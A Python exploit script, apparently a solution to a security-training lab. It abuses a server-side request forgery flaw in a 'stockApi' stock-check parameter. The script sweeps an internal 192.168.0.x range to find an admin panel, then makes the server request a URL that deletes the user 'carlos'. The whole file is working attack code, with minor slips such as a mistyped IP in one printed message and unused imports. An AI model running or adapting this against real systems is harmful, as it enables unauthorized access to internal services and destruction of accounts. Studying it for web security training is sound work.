import sys
from py import process
import requests_ntlm


import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http":"https://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

def delete_user(url,dest_admin):
    ssrf_payload = dest_admin+"/delete?username=carlos"
    check_stock_path = "/product/stock"
    params = {'stockApi':ssrf_payload}
    user_agent = {'User-agent': 'Mozilla/5.0'}
    r = requests.post(url + check_stock_path, headers=user_agent, data = params, verify=False, proxies=proxies)
    
    # Check carlos is deleted

    admin_ssrf_payload = dest_admin
    params2 = {'stockApi': admin_ssrf_payload}

    r = requests.post(url + check_stock_path, headers=user_agent, data = params2, verify=False, proxies=proxies)

    if "User deleted successfully" in r.text:
        print ("(+) User deleted successfully :)")
    else:
        print ("(-) User deletion unsuccessful :(")

def detect_admin(url):
    
    check_stock_path = "/product/stock"
    dest_admin = ""
    for i in range(100,255):

        ssrf_payload = "http://192.168.0.%s:8080/admin" % i
        params = {'stockApi':ssrf_payload}
        user_agent = {'User-agent': 'Mozilla/5.0'}

        r = requests.post(url + check_stock_path, headers=user_agent,  data = params, verify=False, proxies=proxies)
    
        # Check response code
        if r.status_code == 200:
            print ("(+) Internal system IP found :) --> 182.168.0.%s" % i)
            dest_admin = "192.168.0."+str(i)
            break
        else:
            continue
    return ssrf_payload

def main():
    if len(sys.argv) != 2:
        print ("(+) Usage: %s <url> " % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print ("(+) Detecting Internal systems...")
    dest_admin = detect_admin(url)
    print ("(+) Attempting to delete user carlos with payload: "+dest_admin+" ...")
    delete_user(url,dest_admin)

if __name__ == "__main__":
    main()